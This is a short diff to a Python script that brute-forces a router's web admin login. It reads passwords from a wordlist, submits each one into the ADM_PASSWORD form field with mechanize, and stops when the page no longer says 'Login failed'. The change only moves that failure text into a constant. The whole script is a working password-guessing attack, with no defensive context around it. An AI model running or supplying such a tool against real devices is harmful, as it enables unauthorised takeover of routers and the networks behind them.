@@ -11,6 +11,7 @@ if len(sys.argv) != 3:
 	quit()
 ROUTERURL = sys.argv[1]
 WORDLIST = sys.argv[2]
+FAILED_TEXT = "Login failed"
 browser = mechanize.Browser()
 file = open(WORDLIST,"r")
 html = browser.open(ROUTERURL).read()
@@ -20,8 +21,7 @@ for word in file:
 	browser.select_form(nr=0)
 	browser.form['ADM_PASSWORD'] = word
 	html = browser.submit().read()
-	if not "Login failed" in html:
+	if not FAILED_TEXT in html:
 		print "Password found: " + word
 		break
 file.close()
-
